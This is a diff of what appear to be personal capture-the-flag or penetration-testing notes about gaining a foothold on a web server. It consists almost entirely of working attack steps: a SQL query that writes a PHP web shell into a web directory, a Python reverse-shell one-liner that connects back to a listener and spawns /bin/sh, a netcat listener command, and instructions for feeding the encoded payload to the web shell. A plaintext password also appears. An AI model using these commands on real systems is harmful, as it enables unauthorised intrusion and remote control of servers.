@@ -49,3 +49,14 @@ password: Fg-'kKXBj87E:aJ$
 ressource: https://www.hackingarticles.in/shell-uploading-web-server-phpmyadmin/
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/forum/templates_c/pyload.php"
 
+
+
+export RHOST="10.12.100.143";export RPORT=3412;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+## GET a foothold on the machine 
+
+open a port and start listening for incoming connection
+
+nc -lk -p 3412
+
+encode the pyload and pass it to cmd in : https://10.12.100.143/?cmd=(encoded pyload)
